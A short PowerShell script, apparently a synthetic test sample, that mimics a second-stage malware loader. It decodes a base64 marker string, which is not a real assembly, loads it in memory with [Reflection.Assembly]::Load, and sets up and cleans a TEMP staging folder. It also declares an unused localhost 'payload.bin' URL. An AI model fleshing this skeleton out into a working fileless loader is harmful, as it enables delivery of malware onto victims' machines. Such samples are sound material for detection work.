
[CmdletBinding()]
param(
    [string]$Stage2Url = 'http://localhost:8000/payload.bin',
    [int]$TimeoutSec = 48
)
$ErrorActionPreference = "Stop"

try {
    $StageBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjp6dGg2OTI4OHlp")
    Write-Verbose ("Assembly byte count: " + $StageBytes.Length)
    $FetchResult = [Reflection.Assembly]::Load($StageBytes)
    if ($null -ne $FetchResult) {
        Write-Verbose ("Loaded assembly: " + $FetchResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
